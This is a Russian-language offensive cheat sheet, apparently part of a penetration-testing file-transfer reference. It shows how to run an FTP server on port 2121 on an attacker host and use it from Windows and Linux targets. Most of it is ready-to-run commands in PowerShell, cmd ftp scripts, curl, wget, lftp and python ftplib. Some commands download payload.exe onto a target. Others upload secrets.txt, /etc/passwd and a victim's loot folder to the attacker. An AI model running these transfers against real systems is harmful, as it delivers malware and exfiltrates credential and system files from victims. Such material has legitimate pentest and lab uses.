# 05 - FTP

> [← README](../../README_RU.md) · [Следующий раздел →](06-scp-sftp-rsync.md)

FTP работает там, где HTTP/SMB заблокированы. Порт 2121 (нестандартный) часто проходит фильтрацию. Двусторонний обмен (download + upload).

> **Вынесено в другие файлы:** SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), HTTP-загрузка - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md).

---

## Навигация

|  |  |
|---|---|
| [1.💻Attacker - поднять FTP-сервер (LHOST)](#1attacker---поднять-ftp-сервер-lhost) | [2.🪟Windows target ↔ Attacker (всё на RHOST)](#2windows-target--attacker-всё-на-rhost) |
| [3.🐧Linux target ↔ Attacker (всё на RHOST)](#3linux-target--attacker-всё-на-rhost) | [4. Диагностика](#4-диагностика) |

---

## 1.💻Attacker - поднять FTP-сервер (LHOST)

### Установка

**Создать venv и поставить pyftpdlib:**
```bash
python3 -m venv /tmp/ftp-venv && source /tmp/ftp-venv/bin/activate && pip install pyftpdlib
```

**Каталог для файлов:**
```bash
mkdir -p /tmp/share
```

### Варианты запуска

**Анонимный READ ONLY (только скачивание):**
```bash
python3 -m pyftpdlib --port 2121 --directory /tmp/share
```

**Анонимный READ/WRITE (скачивание + загрузка; `-w` обязателен для upload):**
```bash
python3 -m pyftpdlib --port 2121 --write --directory /tmp/share
```

**С аутентификацией, READ (учитываем: `--username`, не `--user`):**
```bash
python3 -m pyftpdlib --port 2121 --username=attacker --password=SecurePass123 --directory /tmp/share
```

**С аутентификацией, READ/WRITE (рекомендуется):**
```bash
python3 -m pyftpdlib --port 2121 --username=attacker --password=SecurePass123 --write --directory /tmp/share
```

### Passive-порты и NAT

FTP открывает **второе** (data) соединение. За NAT/фаерволом задай диапазон пассивных портов и внешний адрес.

**Диапазон пассивных портов + NAT-адрес:**
```bash
python3 -m pyftpdlib --port 2121 --write --directory /tmp/share --range 8000-8100 --nat-address $LHOST
```

**Открыть порты в фаерволе LHOST:**
```bash
sudo ufw allow 2121/tcp && sudo ufw allow 8000:8100/tcp
```

### FTPS (FTP over TLS)

**Сгенерировать сертификат:**
```bash
openssl req -x509 -newkey rsa:2048 -keyout /tmp/ftpd.key -out /tmp/ftpd.crt -nodes -subj '/CN=server'
```

**Запустить FTPS:**
```bash
python3 -m pyftpdlib --port 2121 --username=attacker --password=SecurePass123 --write --directory /tmp/share --tls --keyfile=/tmp/ftpd.key --certfile=/tmp/ftpd.crt
```

> **Где лежат файлы:** корень FTP задаётся `--directory` (`/tmp/share`). При `--write` загруженные целью файлы попадают туда же.

---

## 2.🪟Windows target ↔ Attacker (всё на RHOST)

### Быстрый доступ

**GUI - «Мой компьютер» → вставить адрес и перетащить файлы:**
```text
ftp://LHOST:2121/
```

**Браузер (Firefox/Chrome/Edge):**
```text
ftp://LHOST:2121/
```

### Download (цель получает файл)

**PowerShell - WebClient, анонимно:**
```powershell
(New-Object Net.WebClient).DownloadFile("ftp://${LHOST}:2121/payload.exe", 'C:\Users\Public\payload.exe')
```

**PowerShell - WebClient, с учётными данными:**
```powershell
$c=New-Object Net.WebClient; $c.Credentials=New-Object System.Net.NetworkCredential('attacker','SecurePass123'); $c.DownloadFile("ftp://${LHOST}:2121/payload.exe", 'C:\Users\Public\payload.exe')
```

**curl.exe - самый простой способ на Windows 10+ (встроен):**
```cmd
curl -u attacker:SecurePass123 ftp://%LHOST%:2121/payload.exe -o C:\Users\Public\payload.exe
```

**CMD - скрипт-файл `ftp.txt` (анонимно):**
```text
open LHOST 2121
anonymous
anonymous
binary
get payload.exe
bye
```

**CMD - выполнить скрипт:**
```cmd
ftp -v -n -s:ftp.txt
```

**CMD - скрипт-файл `ftp.txt` (с учётными данными):**
```text
open LHOST 2121
attacker
SecurePass123
binary
get payload.exe
bye
```

**CMD - one-liner, анонимно (собираем скрипт и сразу выполняем):**
```cmd
(echo open %LHOST% 2121 & echo USER anonymous & echo PASS anonymous & echo binary & echo GET payload.exe & echo bye) > ftp.txt & ftp -v -n -s:ftp.txt
```

**CMD - one-liner, с учётными данными:**
```cmd
(echo open %LHOST% 2121 & echo USER attacker & echo PASS SecurePass123 & echo binary & echo GET payload.exe & echo bye) > ftp.txt & ftp -v -n -s:ftp.txt
```

**curl.exe - принудительно пассивный режим (если сервер за NAT):**
```cmd
curl --ftp-pasv -u attacker:SecurePass123 ftp://%LHOST%:2121/payload.exe -o C:\Users\Public\payload.exe
```

### Upload (цель отправляет файл)

**PowerShell - WebClient.UploadFile, с учётными данными:**
```powershell
$wc = New-Object System.Net.WebClient; $wc.Credentials = New-Object System.Net.NetworkCredential('attacker','SecurePass123'); $wc.UploadFile("ftp://${LHOST}:2121/secrets.txt", "C:\Users\Public\secrets.txt")
```

**PowerShell - WebClient.UploadFile, анонимно:**
```powershell
(New-Object Net.WebClient).UploadFile("ftp://${LHOST}:2121/secrets.txt", 'C:\Users\Public\secrets.txt')
```

**curl.exe - PUT-загрузка файла:**
```cmd
curl -T C:\Users\Public\secrets.txt -u attacker:SecurePass123 ftp://%LHOST%:2121/secrets.txt
```

**curl.exe - создать подпапки на сервере при загрузке:**
```cmd
curl -T C:\Users\Public\secrets.txt --ftp-create-dirs -u attacker:SecurePass123 ftp://%LHOST%:2121/loot/secrets.txt
```

**CMD - скрипт-файл `ftp_up.txt` (с учётными данными):**
```text
open LHOST 2121
attacker
SecurePass123
binary
put C:\Users\Public\secrets.txt
bye
```

**CMD - выполнить скрипт:**
```cmd
ftp -v -n -s:ftp_up.txt
```

**CMD - one-liner, анонимно:**
```cmd
(echo open %LHOST% 2121 & echo USER anonymous & echo PASS anonymous & echo binary & echo put C:\Users\Public\secrets.txt & echo bye) > ftp_up.txt & ftp -v -n -s:ftp_up.txt
```

---

## 3.🐧Linux target ↔ Attacker (всё на RHOST)

### Download (цель получает файл)

**ftp - интерактивно, анонимный логин:**
```bash
ftp $LHOST 2121
```

**Команды внутри сессии:**
```text
anonymous
anonymous
binary
get payload.exe
quit
```

**ftp - one-liner с учётными данными (heredoc):**
```bash
ftp -n $LHOST 2121 <<EOF
user attacker SecurePass123
binary
get payload.exe
quit
EOF
```

**curl - скачать одной командой, без интерактивной сессии:**
```bash
curl ftp://$LHOST:2121/payload.exe -o payload.exe
```

**curl - с учётными данными и пассивным режимом:**
```bash
curl --ftp-pasv -u attacker:SecurePass123 ftp://$LHOST:2121/payload.exe -o payload.exe
```

**wget - запасной вариант, если нет curl:**
```bash
wget ftp://$LHOST:2121/payload.exe
```

**wget - рекурсивно забрать каталог:**
```bash
wget -r ftp://attacker:SecurePass123@$LHOST:2121/
```

**lftp - рекурсивно (`mirror`), удобно для целых папок:**
```bash
lftp -u attacker,SecurePass123 $LHOST:2121 -e "mirror /loot /tmp/loot; bye"
```

**python3 ftplib - когда нет вообще ничего:**
```bash
python3 -c 'import ftplib;f=ftplib.FTP();f.connect("'"$LHOST"'",2121);f.login("attacker","SecurePass123");f.retrbinary("RETR payload.exe", open("payload.exe","wb").write)'
```

### Upload (цель отправляет файл)

**ftp - интерактивно, `put` заливает файл:**
```bash
ftp $LHOST 2121
```

**Команды внутри сессии:**
```text
anonymous
anonymous
binary
put /etc/passwd
quit
```

**curl - загрузка (анонимно, пустой пароль):**
```bash
curl -T /etc/passwd ftp://$LHOST:2121/ --user anonymous:
```

**curl - с учётными данными:**
```bash
curl -T /etc/passwd --user attacker:SecurePass123 ftp://$LHOST:2121/passwd
```

**curl - создать подпапки при загрузке:**
```bash
curl -T /etc/passwd --ftp-create-dirs --user attacker:SecurePass123 ftp://$LHOST:2121/loot/passwd
```

**lftp - рекурсивно залить каталог (`mirror -R`):**
```bash
lftp -u attacker,SecurePass123 $LHOST:2121 -e "mirror -R /home/victim/loot /loot; bye"
```

**python3 ftplib:**
```bash
python3 -c 'import ftplib;f=ftplib.FTP();f.connect("'"$LHOST"'",2121);f.login("attacker","SecurePass123");f.storbinary("STOR secrets.txt", open("secrets.txt","rb"))'
```

---

## 4. Диагностика

**Порт открыт:**
```bash
nc -zv $LHOST 2121
```

**Баннер и логин (curl показывает FTP-диалог):**
```bash
curl -v ftp://$LHOST:2121/
```

**Проверить логин/пароль:**
```bash
curl -u attacker:SecurePass123 ftp://$LHOST:2121/
```

**Слушает ли сервер и на каком интерфейсе (смотреть на LHOST):**
```bash
ss -tlnp | grep 2121
```

> **Частые грабли:**
>
> - **Пассивный vs активный режим.** FTP поднимает второе (data) соединение. Активный (`PORT`) требует, чтобы **сервер** подключился к клиенту - часто режется фаерволом/NAT цели. Обычно нужен **пассивный** (`PASV`): в `ftp`-клиенте команда `passive`, `curl --ftp-pasv` (по умолчанию), `lftp set ftp:passive-mode on`.
> - **За NAT** задаём `--range 8000-8100 --nat-address $LHOST` и открываем эти порты.
> - **Upload не работает** → почти всегда забыт `-w/--write` (по умолчанию шара read-only) или у пользователя нет прав.
> - **`--username`, а не `--user`** - иначе pyftpdlib не поймёт опцию.
> - **Анонимный логин отключается**, как только задан `--username`.
> - **Порт 21 может быть зарезан** - поэтому и берём 2121; но проверяем, что он открыт и на LHOST (фаервол).
> - **FTPS** включается `--tls` + `--keyfile/--certfile`; клиенты - `curl --ftp-ssl -k`, `lftp set ftp:ssl-force on`.

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST  (в URL - ${LHOST} перед двоеточием!)
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
